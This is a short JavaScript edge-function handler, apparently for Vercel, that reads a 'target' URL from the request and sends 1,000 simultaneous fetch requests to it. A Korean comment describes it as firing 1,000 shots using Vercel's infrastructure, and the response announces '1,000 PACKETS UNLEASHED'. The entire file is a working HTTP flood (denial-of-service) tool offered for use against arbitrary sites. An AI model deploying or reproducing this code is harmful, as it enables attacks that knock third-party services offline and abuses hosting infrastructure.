export const config = { runtime: 'edge' };
export default async function handler(req) {
  const { searchParams } = new URL(req.url);
  const target = searchParams.get('target');
  if (!target) return new Response("TARGET_MISSING", { status: 400 });

  // Vercel 인프라를 이용해 1,000발 동시 발사
  const attack = Array.from({ length: 1000 }).map(() =>
    fetch(target, { mode: 'no-cors' }).catch(() => {})
  );
  await Promise.all(attack);
  return new Response("1,000 PACKETS UNLEASHED");
}
